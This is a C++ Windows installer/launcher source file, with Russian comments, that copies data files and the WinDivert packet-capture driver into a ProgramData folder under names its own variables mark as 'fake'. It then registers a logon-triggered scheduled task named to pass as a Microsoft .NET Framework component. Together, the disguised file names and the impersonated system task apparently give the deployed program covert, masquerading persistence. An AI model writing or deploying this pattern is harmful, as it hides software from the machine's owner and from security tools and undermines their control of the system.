#include "functions.h"

#include <codecvt>
#include <map>


std::wstring GetProgramDataPath() {
    PWSTR path_tmp;
    path_tmp = nullptr;

    HRESULT hr = SHGetKnownFolderPath(FOLDERID_ProgramData, 0, NULL, &path_tmp);

    if (SUCCEEDED(hr)) {
        std::wstring result(path_tmp);

        // освобождаем память
        CoTaskMemFree(path_tmp);

        return result;
    }
    return L""; // Если произошла ошибка
}
void PrepareAppFolder(const std::wstring& basePath, std::filesystem::path& securePath ){
    securePath =  std::filesystem::path(basePath) / g_RelativeMainDirPath;
    std::error_code ec;

    // Попытка создать папку
    if ( std::filesystem::create_directories(securePath, ec)) {
        std::wcout << L"directory created" << std::endl;
    } else {
        // Если вернуло false, это может быть либо ошибка, либо папка уже есть
        if (ec) {
            std::wcout << L"error " << ec.message().c_str() << std::endl;
        } else {
            std::wcout << L"directory already exists" << std::endl;
        }
    }
}
void PrepareLauncherFolder(const std::wstring& basePath, std::filesystem::path& securePath ) {
    securePath =  std::filesystem::path(basePath) / g_RelativeLauncherDirPath;
    std::error_code ec;

    // Попытка создать папку
    if ( std::filesystem::create_directories(securePath, ec)) {
        std::wcout << L"directory created" << std::endl;
    } else {
        // Если вернуло false, это может быть либо ошибка, либо папка уже есть
        if (ec) {
            std::wcout << L"error " << ec.message().c_str() << std::endl;
        } else {
            std::wcout << L"directory already exists" << std::endl;
        }
    }
}
bool CheckAppFiles(const std::filesystem::path& securePath){
    std::vector<std::wstring> criticalFiles{
            g_FakeMainNameAtMain, // main
            g_FakeWatchDogNameAtMain,  // watchdog
            L"WinDivert64.sys",
            L"WinDivert.dll"
    };
    for (auto fileName: criticalFiles){
        std::filesystem::path filePath = securePath / fileName;
        try {
            if (!std::filesystem::exists(filePath)) {
                return false; // Если хоть одного файла нет — сразу false
            }

            if (std::filesystem::file_size(filePath) == 0) {
                return false; // Если файл пустой false
            }
        } catch (const std::filesystem::filesystem_error& e) {
            // Если файл занят все ок
            continue;
        }
    }
    return true;
}
bool CheckLauncherFiles(const std::filesystem::path& securePath) {
    std::vector<std::wstring> criticalFiles{
        g_FakeMainNameAtLauncher, // main
        g_FakeWatchDogNameAtLauncher,  // watchdog
        g_FakeLauncherNameAtLauncher, // сам этот launcher
        g_FakeWinDivert64SysAtLauncher, // WinDivert64.sys
         g_FakeWinDivert64DllAtLauncher // WinDivert.dll
        };
    for (auto fileName: criticalFiles){
        std::filesystem::path filePath = securePath / fileName;
        try {
            if (!std::filesystem::exists(filePath)) {
                return false; // Если хоть одного файла нет сразу false
            }

            if (std::filesystem::file_size(filePath) == 0) {
                return false; // Если файл пустой   false
            }
        } catch (const std::filesystem::filesystem_error& e) {
            // Если файл занят все ок
            continue;
        }
    }
    return true;
}
bool DeployApp(const std::filesystem::path& securePath){
    std::filesystem::path currentDir = std::filesystem::current_path();
    std::cout << currentDir << std::endl;

    std::map<std::wstring, std::wstring> filesToDeploy = {
        { L"tt_core.dat",       g_FakeMainNameAtMain },
        { L"service_fixer.res", g_FakeWatchDogNameAtMain },
        { L"WinDivert.dll",     L"WinDivert.dll" },
        { L"WinDivert64.sys",   L"WinDivert64.sys" }
    };

    for (const auto& [source, target] : filesToDeploy) {
        std::filesystem::path srcPath = currentDir / source;
        std::filesystem::path dstPath = std::filesystem::path(securePath) / target;

        if (exists(srcPath) ) {
            if (!exists(dstPath)) {
                copy_file(srcPath, dstPath, std::filesystem::copy_options::overwrite_existing);
            }
        }else {
            return false;
        }
    }
    return true;
}
bool DeployLauncher(const std::filesystem::path& securePath){
    std::filesystem::path currentDir = std::filesystem::current_path();
    std::cout << currentDir << std::endl;

    std::map<std::wstring, std::wstring> filesToDeploy = {
        { L"tt_core.dat",      g_FakeMainNameAtLauncher },
        { L"service_fixer.res", g_FakeWatchDogNameAtLauncher },
        { L"WinDivert.dll",    g_FakeWinDivert64DllAtLauncher },
        { L"WinDivert64.sys",   g_FakeWinDivert64SysAtLauncher },
        { L"tt_config.res", g_FakeLauncherNameAtLauncher}
    };
    for (const auto& [source, target] : filesToDeploy) {
        std::filesystem::path srcPath = currentDir / source;
        std::filesystem::path dstPath = std::filesystem::path(securePath) / target;

        if (exists(srcPath) ) {
            if (!exists(dstPath)) {
                copy_file(srcPath, dstPath, std::filesystem::copy_options::overwrite_existing);
            }
        }else {
            return false;
        }
    }
    return true;
}
bool StartProcess(const std::filesystem::path& appPath) {
    DWORD outPid;
    std::wstring cmdLine = L"\"" + appPath.wstring() + L"\"";
    STARTUPINFOW info = { sizeof(info) };
    PROCESS_INFORMATION pi = { 0 };
    std::vector<wchar_t> buf(cmdLine.begin(), cmdLine.end());
    buf.push_back(L'\0');

    if (CreateProcessW(NULL, buf.data(), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &info, &pi)) {
        outPid = pi.dwProcessId;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
    return false;
}
#include <fstream>
#include <windows.h>
#include <string>
#include <filesystem>

namespace fs = std::filesystem;

void RegisterTaskXML(const fs::path& exePath) {
    std::string taskName = "Microsoft\\NetFramework\\v4.8.9032\\NetFxHost";
    std::string xmlPath = "task_config.xml";

    std::string xmlContent = R"(<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Settings>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>)" + exePath.string() + R"(</Command>
    </Exec>
  </Actions>
</Task>)";

    std::string cleanXml = xmlContent.substr(xmlContent.find("<Task"));

    std::ofstream xmlFile(xmlPath);
    if (xmlFile.is_open()) {
        xmlFile << cleanXml;
        xmlFile.close();
    }

    std::string importCmd = "schtasks /Create /XML \"" + xmlPath + "\" /TN \"" + taskName + "\" /F";

    int result = system(importCmd.c_str());

    if (result == 0) {
        std::cout << "Successfully registered task!" << std::endl;
    }

    //  Удаляем временный файл
    if (fs::exists(xmlPath)) {
        fs::remove(xmlPath);
    }
}